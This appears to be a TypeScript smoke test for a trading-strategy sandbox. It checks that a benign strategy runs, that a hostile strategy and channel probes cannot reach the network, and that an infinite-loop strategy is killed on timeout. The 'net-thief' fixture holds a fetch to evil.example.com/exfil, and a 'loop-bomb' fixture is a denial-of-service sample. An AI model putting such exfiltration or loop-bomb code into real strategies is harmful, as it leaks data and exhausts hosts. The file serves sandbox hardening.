import { spawnSync } from 'node:child_process'
import { rmSync, mkdirSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { runInSandbox, sandboxNodeArgs } from '../server/sandbox/index.ts'
import { genSynthCandles } from '../src/engine/index.ts'

interface Scenario {
  name: string
  pass: boolean
  detail: string
}
const scenarios: Scenario[] = []

function fail(name: string, msg: string): never {
  scenarios.push({ name, pass: false, detail: msg })
  archive()
  console.error(`[FAIL] SANDBOX SMOKE FAIL - ${name} - ${msg}`)
  process.exit(1)
}

function pass(name: string, detail: string): void {
  scenarios.push({ name, pass: true, detail })
  console.log(`[OK] ${name} - ${detail}`)
}

function archive(): void {
  const dir = join(process.cwd(), 'artifacts')
  mkdirSync(dir, { recursive: true })
  writeFileSync(join(dir, 'sandbox-latest.json'), JSON.stringify({ startedAt: new Date().toISOString(), finishedAt: new Date().toISOString(), scenarios }, null, 2))
}

const BENIGN = `
function makeStrategy(E){
  return {
    id:'custom-rev',
    params:{lookback:1},
    decide(ctx){
      if (ctx.i < 1) return null
      const c = ctx.candles[ctx.i].c
      const p = ctx.candles[ctx.i-1].c
      if (c < p && ctx.posQty <= 0) return { side:'buy', type:'market', frac:0.9 }
      if (c > p && ctx.posQty > 0) return { side:'sell', type:'market', frac:1 }
      return null
    }
  }
}
`

const NET_ATTACK = `
function makeStrategy(E){
  return { id:'net-thief', params:{}, decide(ctx){
    fetch('https://evil.example.com/exfil').catch(()=>{})
    return null
  }}
}
`

const LOOP_BOMB = `
function makeStrategy(E){
  return { id:'loop-bomb', params:{}, decide(ctx){
    while(true){}
  }}
}
`

async function main() {
  const candles = genSynthCandles({ seed: 99, bars: 960, startPrice: 100, volDaily: 0.04, driftDaily: 0.0003, barMinutes: 15 })

  const r1 = await runInSandbox(BENIGN, candles, 15_000)
  if (!r1.ok || typeof r1.fitness !== 'number' || !Number.isFinite(r1.fitness)) {
    fail('S1 benign strategy evaluation', JSON.stringify(r1).slice(0, 200))
  }
  pass('S1 benign strategy evaluation', `fitness=${r1.fitness} fills=${r1.fills} ann=${r1.report?.annReturnPct}%`)

  const t2 = Date.now()
  const r2 = await runInSandbox(NET_ATTACK, candles, 15_000)
  // 攻击策略必须被**容纳**：它自己崩掉（ok:false）是可接受的，
  // 但不允许它跑完并返回一个正常结果 —— 那意味着它成功执行了。
  if (r2.reason?.startsWith('SANDBOX_TIMEOUT')) fail('S2 network blocked in sandbox', `hung until timeout: ${JSON.stringify(r2)}`)
  if (r2.ok) fail('S2 hostile code contained', `含外联代码的策略竟正常跑完：${JSON.stringify(r2).slice(0, 200)}`)

  // 显式探针：逐条验证出网通道是否真的被封。
  //
  // ⚠️ 必须净化 env（尤其是 NODE_OPTIONS）。宿主环境可能注入了
  // `--require <shim>` 之类的启动参数；子进程在 --permission 下加载该文件会被拒，
  // 于是子进程**在跑到探针之前就崩溃**，stdout 为空 → 得到一个与网络无关的假阴性。
  // 生产沙箱 `server/sandbox/index.ts` 的 safeEnv() 正是这么净化的，探针需与之一致。
  //
  // ⚠️ 启动参数必须从 `sandboxNodeArgs()` 取，不能在这里自己拼。
  // 曾经这里手写 `['--permission', '-e', …]` —— 只验证了「--permission 这个 flag 有效」，
  // 而它恰好不覆盖网络，于是红灯长期挂着，还把矛头指向了错误的方向。
  // 现在探针与生产沙箱共用同一份参数，验证的是**沙箱本身**。
  const probeEnv: NodeJS.ProcessEnv = { NODE_OPTIONS: '' }
  for (const k of ['PATH', 'Path', 'SYSTEMROOT', 'SystemRoot', 'TEMP', 'TMP', 'COMSPEC', 'windir', 'WINDIR']) {
    if (process.env[k] !== undefined) probeEnv[k] = process.env[k]
  }
  const probeCode = `
const tries = [];
async function attempt(name, fn) {
  try { await fn(); tries.push([name, 'ALLOWED']); }
  catch (e) {
    const m = String(e && e.message || e);
    tries.push([name, m.includes('SANDBOX_NETWORK_BLOCKED') ? 'BLOCKED' : 'ERROR:' + m.slice(0, 50)]);
  }
}
(async () => {
  await attempt('fetch', () => fetch('https://example.com'));
  await attempt('net.connect', async () => { const m = await import('node:net'); m.connect(80, 'example.com'); });
  await attempt('https.get', async () => { const m = await import('node:https'); m.get('https://example.com'); });
  await attempt('dns.lookup', async () => { const m = await import('node:dns'); await new Promise((res, rej) => m.lookup('example.com', (e) => e ? rej(e) : res())); });
  console.log('###RESULT###' + JSON.stringify({ tries }));
})();
`
  const probe = spawnSync(process.execPath, [...sandboxNodeArgs(), '-e', probeCode], {
    encoding: 'utf-8',
    timeout: 15_000,
    env: probeEnv,
  })
  const line = (probe.stdout ?? '').split('\n').find((l) => l.startsWith('###RESULT###')) ?? ''
  let verdict: { tries?: [string, string][] } = {}
  try {
    verdict = JSON.parse(line.slice('###RESULT###'.length))
  } catch {
    fail('S2 network blocked in sandbox', `probe no result: stdout=${JSON.stringify((probe.stdout ?? '').slice(-200))} stderr=${JSON.stringify((probe.stderr ?? '').slice(-200))}`)
  }
  const tries = verdict.tries ?? []
  if (tries.length === 0) fail('S2 network blocked in sandbox', `探针未回报任何通道：${line.slice(0, 160)}`)
  const leaked = tries.filter(([, st]) => st !== 'BLOCKED')
  if (leaked.length > 0) {
    fail('S2 network blocked in sandbox', `以下出网通道未被封锁：${JSON.stringify(leaked)}`)
  }
  pass(
    'S2 hostile code contained + network blocked',
    `${tries.length} 条出网通道全部封锁（${tries.map(([n]) => n).join('/')}） · 攻击策略被容纳（${Date.now() - t2}ms, reason=${r2.reason ?? 'ok'}）`,
  )

  const t3 = Date.now()
  const r3 = await runInSandbox(LOOP_BOMB, candles, 3_000)
  if (r3.ok) fail('S3 infinite loop timeout kill', 'loop bomb returned ok')
  if (r3.reason !== 'SANDBOX_TIMEOUT') fail('S3 infinite loop timeout kill', `expected SANDBOX_TIMEOUT got ${r3.reason}`)
  const elapsed = Date.now() - t3
  if (elapsed > 8_000) fail('S3 infinite loop timeout kill', `kill took ${elapsed}ms`)
  pass('S3 infinite loop timeout kill', `SIGKILL at ~3s (actual ${elapsed}ms)`)

  archive()
  console.log('')
  console.log('[ARCHIVED] artifacts/sandbox-latest.json')
  console.log(`scenarios ${scenarios.filter((x) => x.pass).length}/${scenarios.length} passed`)
  console.log('SANDBOX SMOKE PASSED')
}

function cleanupLegacy(): void {
  rmSync(join('data', 'unused-placeholder.db'), { force: true })
}

main()
  .then(() => {
    cleanupLegacy()
  })
  .catch((e) => {
    console.error(`[CRASH] ${e instanceof Error ? e.stack : e}`)
    process.exit(1)
  })
